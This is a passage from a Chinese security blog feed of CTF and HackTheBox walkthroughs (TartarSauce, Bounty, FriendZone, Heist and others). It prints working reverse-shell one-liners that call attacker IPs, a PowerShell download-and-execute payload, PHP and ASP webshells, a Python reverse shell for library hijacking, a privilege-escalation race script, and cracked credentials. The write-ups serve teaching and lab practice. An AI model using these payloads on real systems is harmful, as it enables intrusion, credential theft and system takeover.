&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; secret由bin2hex(random_bytes(64))生成，如果这个值匹配就能得到flag，但看下PHP文档就知道这不太现实。 因此需要用其他的方法得到FLAG，从include &#39;config.php&#39;; // FLAG is defined in config.php可以知道FLAG在config.php中，也就是说，我么需要某种方式读取config.php 注意到highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));，这里很可疑，basename是一个返回指定路径文件名的函数，$_SERVER[&#39;PHP_SELF&#39;]是当前正在执行的脚本的文件名，这里是用于显示自身源码。 但是，为什么开头有一个检查，要求$_SERVER[&#39;PHP_SELF&#39;]不是以config.php结尾的字符串。这是因为，如果访问的是/index.php/config.php(运行的是index.php), 这种情况下$_SERVER[&#39;PHP_SELF&#39;]是/index.php/config.php,但basename返回的是config.php,因此highlight_file会将config.php的内容显示出来。也就是说，如果绕过了这个检查，我们就能够得到FLAG。 看一下basename的文档。 注意这一句： Note: basename() is locale aware, so for it to see the correct basename with multibyte character paths, the matching locale must be set using the setlocale() function. 为了获得包含多字节字符的路径的正确结果，需要预先使用setlocale() 进行适当设置。 那如果没有进行恰当的设置会发生什么，我们可以简单测试一下： 123456789101112131415161718192021222324252627282930313233$ docker run --rm -it php:7.3-apache bash︙root@a06cc21f03e1:&#x2F;tmp# apt install -y libicu-devroot@a06cc21f03e1:&#x2F;tmp# docker-php-ext-install intlroot@a06cc21f03e1:&#x2F;tmp# cat test.php&lt;?phpfunction check($str) &#123; return preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $str);&#125;for ($i &#x3D; 0; $i &lt; 0x100; $i++) &#123; $s &#x3D; &#39;&#x2F;index.php&#x2F;config.php&#x2F;&#39; . IntlChar::chr($i); if (!check($s)) &#123; $t &#x3D; basename(&#39;&#x2F;index.php&#x2F;config.php&#x2F;&#39; . chr($i)); echo &quot;$&#123;i&#125;: $&#123;t&#125;\\n&quot;; &#125;&#125;root@a06cc21f03e1:&#x2F;tmp# php test.php︙120: x121: y122: z123: &#123;124: |125: &#125;126: ~127: ^?128: config.php129: config.php130: config.php131: config.php132: config.php︙ /index.php/config.php/%80就可以绕过开始的检查，让basename返回config.php,因此访http://URL/index.php/config.php/%80?source的话，就能够得到config.php的内容。 参考资料https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"TartarSauce - HackTheBox","slug":"TartarSauce-HackTheBox","date":"2020-03-08T07:51:22.000Z","updated":"2021-04-30T07:52:17.510Z","comments":true,"path":"2020/03/08/TartarSauce-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/08/TartarSauce-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/138 10.10.10.88 端口扫描 只有80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.10.88Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-30 13:59 CSTNmap scan report for 10.10.10.88Host is up (0.067s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 5 disallowed entries| /webservices/tar/tar/source/| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/|_/webservices/developmental/ /webservices/phpmyadmin/|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Landing PageService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds 80首页没什么东西： 目录扫描robots可以知道webservices，扫描也能发现，继续扫描得到wp： 12345678910➜ Desktop gobuster dir -u http://10.10.10.88/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/index.html (Status: 200) [Size: 10766]/robots.txt (Status: 200) [Size: 208]/server-status (Status: 403) [Size: 299]/webservices (Status: 301) [Size: 316] [--&gt; http://10.10.10.88/webservices/]➜ Desktop gobuster dir -u http://10.10.10.88/webservices/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/wp (Status: 301) [Size: 319] [--&gt; http://10.10.10.88/webservices/wp/] wp是wordprss，显示不正常需要加下hosts： 110.10.10.88 tartarsauce.htb wpscanWpscan可以发现老版本插件，默认选项没有发现，可以指定参数,并且当前版本要aggressive模式才能扫到： 123wpscan --url http://tartarsauce.htb/webservices/wp/wpscan --url http://tartarsauce.htb/webservices/wp/ --enumerate p,t,uwpscan --url http://tartarsauce.htb/webservices/wp --enumerate p --plugins-detection aggressive Gwolle这个实际上是1.5.3版本，readme里有说明： 而1.5.3搜到rfi： WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/38861 RFI webshell根据log，shell重命令，得到webshell： reverse shell123http:&#x2F;&#x2F;tartarsauce.htb&#x2F;webservices&#x2F;wp&#x2F;wp-content&#x2F;plugins&#x2F;gwolle-gb&#x2F;frontend&#x2F;captcha&#x2F;ajaxresponse.php?abspath&#x3D;http:&#x2F;&#x2F;10.10.14.11:7777&#x2F;shell&amp;cmd&#x3D;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh%20-i%202%3E%261|nc%2010.10.14.11%204444%20%3E&#x2F;tmp&#x2F;fpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; onuma当前www-data可以以onuma身份运行tar： to onuma https://gtfobins.github.io/gtfobins/tar/#sudo 1sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash user flagonuma用户目录得到user.txt: 提权信息pspy之类的可以发现backuperer定期以root运行： 123456782021&#x2F;04&#x2F;30 02:47:11 CMD: UID&#x3D;0 PID&#x3D;26084 | &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;sbin&#x2F;backuperer[+] Searching Wordpress wp-config.php fileswp-config.php files found:&#x2F;var&#x2F;www&#x2F;html&#x2F;webservices&#x2F;wp&#x2F;wp-config.phpdefine(&#39;DB_NAME&#39;, &#39;wp&#39;);define(&#39;DB_USER&#39;, &#39;wpuser&#39;);define(&#39;DB_PASSWORD&#39;, &#39;w0rdpr3$$d@t@b@$3@cc3$$&#39;);define(&#39;DB_HOST&#39;, &#39;localhost&#39;); 查看文件内容，流程大概是这样： 123456789101112131415161718# Backup onuma website dev files.# 备份&#x2F;var&#x2F;www&#x2F;html到&#x2F;var&#x2F;tmp，-z使用gzip&#x2F;usr&#x2F;bin&#x2F;sudo -u onuma &#x2F;bin&#x2F;tar -zcvf $tmpfile $basedir &amp;# sleep 30秒&#x2F;bin&#x2F;sleep 30# 创建&#x2F;var&#x2F;tmp&#x2F;check 目录&#x2F;bin&#x2F;mkdir $check# 提取备份文件到check目录&#x2F;bin&#x2F;tar -zxvf $tmpfile -C $check# 运行integrity_chk函数，检查通过，将备份文件移动到&#x2F;var&#x2F;backups&#x2F;onuma-www-dev.bak，然后删除备份文件，不通过则输出error msgintegrity_chk()&#123; &#x2F;usr&#x2F;bin&#x2F;diff -r $basedir $check$basedir&#125; 条件竞争就是利用sleep的那30秒，在sleep期间解压存档，修改其中的某个文件为软链接，然后重新存档，这样当脚本自动打开存档进行diff的时候，文件不同，会将errormsg包括两个文件的内容写到onuma_backup_error.txt 也可以直接suid文件，sleep的30秒内将suid文件写进去，等他自动解压到check /usr/sbin/backuperer1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/bin/bash#-------------------------------------------------------------------------------------# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ# ONUMA Dev auto backup program# This tool will keep our webapp backed up incase another skiddie defaces us again.# We will be able to quickly restore from a backup in seconds ;P#-------------------------------------------------------------------------------------# Set Vars Herebasedir=/var/www/htmlbkpdir=/var/backupstmpdir=/var/tmptestmsg=$bkpdir/onuma_backup_test.txterrormsg=$bkpdir/onuma_backup_error.txttmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)check=$tmpdir/check# formattingprintbdr()&#123; for n in $(seq 72); do /usr/bin/printf $\"-\"; done&#125;bdr=$(printbdr)# Added a test file to let us see when the last backup was run/usr/bin/printf $\"$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n\" &gt; $testmsg# Cleanup from last time./bin/rm -rf $tmpdir/.* $check# Backup onuma website dev files./usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &amp;# Added delay to wait for backup to complete if large files get added./bin/sleep 30# Test the backup integrityintegrity_chk()&#123; /usr/bin/diff -r $basedir $check$basedir&#125;/bin/mkdir $check/bin/tar -zxvf $tmpfile -C $checkif [[ $(integrity_chk) ]]then # Report errors so the dev can investigate the issue. /usr/bin/printf $\"$bdr\\nIntegrity Check Error in backup last ran : $(/bin/date)\\n$bdr\\n$tmpfile\\n\" &gt;&gt; $errormsg integrity_chk &gt;&gt; $errormsg exit 2else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak /bin/rm -rf $check .* exit 0fi 提权 &amp; root flag123456789101112cp /bin/bash .sudo chown root bashsudo chmod +xs bashmkdir -p var/www/htmlmv bash var/www/htmltar -zcvf shell.tar.gz var/# /var/tmp下发现生成后就覆盖cp /tmp/shell.tar.gz .ce9d5a30bafb9c15cbf4a5b8d77c2b17f3cd1148# 等解压check，进去执行suid# 要一个32位的，我复制64的出错，不想再重复了 软链接 get root flag做软链接去查看报错文件： exp.sh1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/bin/bash# work out of shmcd /dev/shm# set both start and cur equal to any backup file if it's therestart=$(find /var/tmp -maxdepth 1 -type f -name \".*\")cur=$(find /var/tmp -maxdepth 1 -type f -name \".*\")# loop until there's a change in curecho \"Waiting for archive filename to change...\"while [ \"$start\" == \"$cur\" -o \"$cur\" == \"\" ] ; do sleep 10; cur=$(find /var/tmp -maxdepth 1 -type f -name \".*\");done# Grab a copy of the archiveecho \"File changed... copying here\"cp $cur .# get filenamefn=$(echo $cur | cut -d'/' -f4)# extract archivetar -zxf $fn# remove robots.txt and replace it with link to root.txtrm var/www/html/robots.txtln -s /root/root.txt var/www/html/robots.txt# remove old archiverm $fn# create new archivetar czf $fn var# put it back, and clean upmv $fn $currm $fnrm -rf var# wait for resultsecho \"Waiting for new logs...\"tail -f /var/backups/onuma_backup_error.txt 参考资料 WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/38861 https://gtfobins.github.io/gtfobins/tar/#sudo HTB: TartarSauce | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html https://www.hackthebox.eu/home/machines/writeup/138 HackTheBox - Tartarsauce - YouTubehttps://www.youtube.com/watch?v=9MeBiP637ZA&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bounty - HackTheBox","slug":"Bounty-HackTheBox","date":"2020-03-07T08:22:20.000Z","updated":"2021-04-29T08:24:00.860Z","comments":true,"path":"2020/03/07/Bounty-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/07/Bounty-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/142 10.10.10.93 端口扫描只有80: 12345678910111213141516$ nmap -sC -sV -Pn 10.10.10.93Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 15:08 CSTNmap scan report for 10.10.10.93Host is up (0.070s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: BountyService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 68.47 seconds 80一张图： 目录扫描 因为是iis，所以指定asp和aspx，目录扫描结果： 12345➜ ~ gobuster dir -u http://10.10.10.93/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x asp,aspx,html,txt -t 50/aspnet_client (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/aspnet_client/]/transfer.aspx (Status: 200) [Size: 941]/uploadedfiles (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/uploadedfiles/] transfer.aspx文件上传功能： 文件上传正常的文件上传测试，没有重命名： aspx不能直接上传aspx，可以00截断： 但不能解析，继续测试发现可以上传config： web.config根据这篇文章，可以在web.config中加入asp代码： Upload a web.config File for Fun &amp; Profit | Soroush Dalili (@irsdl) – سروش دلیلیhttps://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ 上传访问，发现成功执行： reverse shell所以就可以直接asp加载powershell reverse shell： 1234&lt;%@ Language&#x3D;VBScript %&gt;&lt;% call Server.CreateObject(&quot;WSCRIPT.SHELL&quot;).Run(&quot;cmd.exe &#x2F;c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot;)%&gt; user flagmerlin用户桌面隐藏文件，user.txt: 提权信息systeminfo看一下然后内核提权，查看权限也能看到SeAssignPrimaryTokenPrivilege，可以juicypotato提权 ms10_092_schelevator ms16_014_wmi_recv_notif Juicy Potato 1234567891011121314PS C:\\temp&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeIncreaseWorkingSetPrivilege Increase a process working set DisabledPS C:\\temp&gt; Juicy Potato提权juicy potato打到system： 123456789 # smb传文件 net use \\\\10.10.14.10\\miao copy \\\\10.10.14.10\\miao\\JuicyPotato.exe . copy \\\\10.10.14.10\\miao\\rev.bat . # rev.batpowershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10:7777/Invoke-PowerShellTcp.ps1')./JuicyPotato.exe -t * -p rev.bat -l 4444 root flagadministrator桌面，root.txt: 参考资料 Upload a web.config File for Fun &amp; Profit | Soroush Dalili (@irsdl) – سروش دلیلیhttps://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ https://github.com/decoder-it/juicy-potato HTB: Bounty | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/10/27/htb-bounty.html https://www.hackthebox.eu/home/machines/writeup/142 HackTheBox - Bounty - YouTubehttps://www.youtube.com/watch?v=7ur4om1K98Y&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"FriendZone - HackTheBox","slug":"FriendZone-HackTheBox","date":"2020-03-06T08:10:09.000Z","updated":"2021-04-26T08:11:58.296Z","comments":true,"path":"2020/03/06/FriendZone-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/06/FriendZone-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/173 10.10.10.123 端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ nmap -sC -sV -Pn 10.10.10.123Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 15:16 CSTNmap scan report for 10.10.10.123Host is up (0.068s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)| 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)|_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)| dns-nsid:|_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Friend Zone Escape software139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)443/tcp open ssl/http Apache httpd 2.4.29|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 404 Not Found| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO| Not valid before: 2018-10-05T21:02:30|_Not valid after: 2018-11-04T21:02:30|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery:| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: friendzone| NetBIOS computer name: FRIENDZONE\\x00| Domain name: \\x00| FQDN: friendzone|_ System time: 2021-04-26T10:17:14+03:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-04-26T07:17:15|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 43.50 seconds 80一张图，根据邮箱得到域名： 53dns域传送，80的域名和nmap结果中的域名一致，得到子域名： 12345678910111213141516$ dig axfr friendzone.red @10.10.10.123; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123;; global options: +cmdfriendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800friendzone.red. 604800 IN AAAA ::1friendzone.red. 604800 IN NS localhost.friendzone.red. 604800 IN A 127.0.0.1administrator1.friendzone.red. 604800 IN A 127.0.0.1hr.friendzone.red. 604800 IN A 127.0.0.1uploads.friendzone.red. 604800 IN A 127.0.0.1friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800;; Query time: 69 msec;; SERVER: 10.10.10.123#53(10.10.10.123);; WHEN: Mon Apr 26 15:19:57 CST 2021;; XFR size: 8 records (messages 1, bytes 261) smbsmb匿名访问： generalgeneral里得到creds.txt，里面是admin账号密码： 123creds for the admin THING:admin:WORKWORKHhallelujah@# FriendZone adminhttps的administrator1.friendzone.red，smd里得到的密码登录： LFI很容易发现lfi，后端会自动加.php后缀： 另外前面smb可以看到Development是可写的，应该就是通过那里写webshell，这边lfi去触发 shellDevelopment扫描得到Development的路径，以便lfi那里使用： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253➜ Desktop nmap --script smb-enum-shares.nse -p445 10.10.10.123Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 10:17 CSTNmap scan report for 10.10.10.123Host is up (0.069s latency).PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-enum-shares:| account_used: guest| \\\\10.10.10.123\\Development:| Type: STYPE_DISKTREE| Comment: FriendZone Samba Server Files| Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\etc\\Development| Anonymous access: READ/WRITE| Current user access: READ/WRITE| \\\\10.10.10.123\\Files:| Type: STYPE_DISKTREE| Comment: FriendZone Samba Server Files /etc/Files| Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\etc\\hole| Anonymous access: &lt;none&gt;| Current user access: &lt;none&gt;| \\\\10.10.10.123\\IPC$:| Type: STYPE_IPC_HIDDEN| Comment: IPC Service (FriendZone server (Samba, Ubuntu))| Users: 1| Max Users: &lt;unlimited&gt;| Path: C:\\tmp| Anonymous access: READ/WRITE| Current user access: READ/WRITE| \\\\10.10.10.123\\general:| Type: STYPE_DISKTREE| Comment: FriendZone Samba Server Files| Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\etc\\general| Anonymous access: READ/WRITE| Current user access: READ/WRITE| \\\\10.10.10.123\\print$:| Type: STYPE_DISKTREE| Comment: Printer Drivers| Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\var\\lib\\samba\\printers| Anonymous access: &lt;none&gt;|_ Current user access: &lt;none&gt;Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds webshell12345&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;smbclient -N &#x2F;&#x2F;10.10.10.123&#x2F;Development -c &#39;put cmd.php miao.php&#39;https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;&amp;pagename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;Development&#x2F;miao&amp;cmd&#x3D;id reverse shell1https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;&amp;pagename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;Development&#x2F;miao&amp;cmd&#x3D;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh%20-i%202%3E%261|nc%2010.10.14.7%204444%20%3E&#x2F;tmp&#x2F;f user flag当前是www-data，但有权限读friend用户目录user.txt: 也可以读文件，得到friend密码，ssh登录： 1friend : Agpyu12!0.213$ 提权信息pspy可以发现reporter.py每两分钟运行一次，查看发现它导入os库，而os我们可控： Privilege Escalation via Python Library Hijacking | rastating.github.iohttps://rastating.github.io/privilege-escalation-via-python-library-hijacking/ 提权 &amp; root flagpython库劫持,在os里加入恶意代码，等待运行： 12345678910import ptyimport sockets=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"10.10.14.7\",4444))dup2(s.fileno(),0)dup2(s.fileno(),1)dup2(s.fileno(),2)pty.spawn(\"/bin/bash\")s.close() 得到root shell： 参考资料 Privilege Escalation via Python Library Hijacking | rastating.github.iohttps://rastating.github.io/privilege-escalation-via-python-library-hijacking/ HTB: FriendZone | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/07/13/htb-friendzone.html#webshell https://www.hackthebox.eu/home/machines/writeup/173 HackTheBox - FriendZone - YouTubehttps://www.youtube.com/watch?v=Zf8p49IzEEA&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Heist - HackTheBox","slug":"Heist-HackTheBox","date":"2020-03-05T07:47:48.000Z","updated":"2021-04-23T07:49:48.431Z","comments":true,"path":"2020/03/05/Heist-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/05/Heist-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/201 10.10.10.149 端口扫描12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.10.149Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 14:52 CSTNmap scan report for 10.10.10.149Host is up (0.070s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-04-23T06:53:37|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 108.08 seconds 80一个登录页面： guest80有guest访问，附件给出config，是cisco路由器： config.txt1234567891011121314151617181920212223242526272829303132333435363738394041version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh hash crack5型用John，7型可以直接在线： http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html 12345678910111213141516170242114B0E143F015F5D1E161713 ： $uperP@ssword02375012182C1A1D751618034F36415408 ： Q4)sJu\\Y8qz*A3?dstealth1agent➜ Desktop sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt[sudo] password for miao:Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format&#x3D;md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256&#x2F;256 AVX2 8x3])Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusstealth1agent (?)1g 0:00:00:20 DONE (2021-04-19 11:07) 0.04921g&#x2F;s 172507p&#x2F;s 172507c&#x2F;s 172507C&#x2F;s stealthy001..steak7893Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed smb现在我们有四个用户名(hazard是guest访问里得到的)和三个密码，可以组合来爆破smb: sharesmb里没什么东西，当前用户密码也不能winrm登录： rpc可以通过rpc获取用户名： 123456789101112131415161718192021➜ Desktop rpcclient -U 'hazard%stealth1agent' 10.10.10.149rpcclient $&gt; lookupnames hazardhazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\\Hazard (1)rpcclient $&gt; ^C➜ Desktop impacket-lookupsid hazard:stealth1agent@10.10.10.149Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Brute forcing SIDs at 10.10.10.149[*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112500: SUPPORTDESK\\Administrator (SidTypeUser)501: SUPPORTDESK\\Guest (SidTypeUser)503: SUPPORTDESK\\DefaultAccount (SidTypeUser)504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)513: SUPPORTDESK\\None (SidTypeGroup)1008: SUPPORTDESK\\Hazard (SidTypeUser)1009: SUPPORTDESK\\support (SidTypeUser)1012: SUPPORTDESK\\Chase (SidTypeUser)1013: SUPPORTDESK\\Jason (SidTypeUser) brute得到的用户名加入字典再次爆破，得到： user flag这组账号密码可以winrm登录，桌面得到user.txt: 提权信息根据todo.txt,Stuff会检查issue，issue就是前面我们看到的guest页面里的东西，那他是通过什么检查呢，可以猜到浏览器，而根据login我们可以看到登录密码是明文的，所以大概就是dump firefox的内存获取密码 123456Stuff to-do:1. Keep checking the issues list.2. Fix the router config.Done:1. Restricted access for guest user. memory dump可以传个procdump上去dump firefox的内存下载下来查找，也可以用mimikittenz直接在内存里搜索： https://github.com/orlyjamie/mimikittenz 修改脚本里的正则，然后加载上去运行，得到密码 1[mimikittenz.MemProcInspector]::AddRegex(&quot;Heist&quot;,&quot;login_username&#x3D;.&#123;1,20&#125;@.&#123;1,20&#125;&amp;login_password&#x3D;.&#123;1,50&#125;&amp;login&#x3D;&quot;) 1Heist login_username&#x3D;admin@support.htb&amp;login_password&#x3D;4dD!5&#125;x&#x2F;re8]FBuZ&amp;login&#x3D; root flag得到的就是Administrator密码，登录上去桌面得到root.txt: 参考资料 http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html https://github.com/orlyjamie/mimikittenz HTB: Heist | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/11/30/htb-heist.html#shell-as-chase https://www.hackthebox.eu/home/machines/writeup/201 HackTheBox - Heist - YouTubehttps://www.youtube.com/watch?v=fmBb6BgLsC8&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bastion - HackTheBox","slug":"Bastion-HackTheBox","date":"2020-03-04T06:47:34.000Z","updated":"2021-04-17T06:48:55.038Z","comments":true,"path":"2020/03/04/Bastion-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/04/Bastion-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/186 10.10.10.134 端口扫描Windows常见端口和ssh： 123456789101112131415161718192021222324252627282930313233343536373839$ nmap -sC -sV -Pn 10.10.10.134Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 